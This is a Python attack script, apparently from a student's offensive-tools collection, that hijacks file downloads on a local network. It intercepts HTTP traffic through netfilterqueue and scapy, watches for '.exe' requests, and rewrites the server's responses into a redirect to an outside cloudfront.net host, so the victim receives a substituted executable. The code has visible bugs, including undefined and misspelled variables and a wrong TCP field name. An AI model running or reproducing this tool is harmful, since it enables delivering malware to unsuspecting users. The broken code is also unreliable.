# coding=utf-8                                                                                           

"""                                                                                                      
    Security - Multiples offencives Tools                                                                
    Copyright (C) 2019 nbeny                                                                        
    <nbeny@student.42.fr>                                                                                
    This program is free software: you can redistribute it and/or modify                                 
    it under the terms of the GNU General Public License as published by                                 
    the Free Software Foundation, either version 3 of the License, or                                    
    (at your option) any later version.                                                                  
    This program is distributed in the hope that it will be useful,                                      
    but WITHOUT ANY WARRANTY; without even the implied warranty of                                       
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                                        
    GNU General Public License for more details.                                                         
    You should have received a copy of the GNU General Public License                                    
    along with this program.  If not, see <https://www.gnu.org/licenses/>.                               
"""

#!/usr/bin/env python

# Ijacking

import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
   # del scapy_packet[scapy.TCP].len
    del scapy_packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ask_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Responce")
            if scapy_packet[scapy.TCP].sec in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].sec)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://d22ti63kw1h9x5.cloudfront.net\n\n")
                
                packet.set_payload(str(scapy_packet))
            print(scapy_packet.show())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
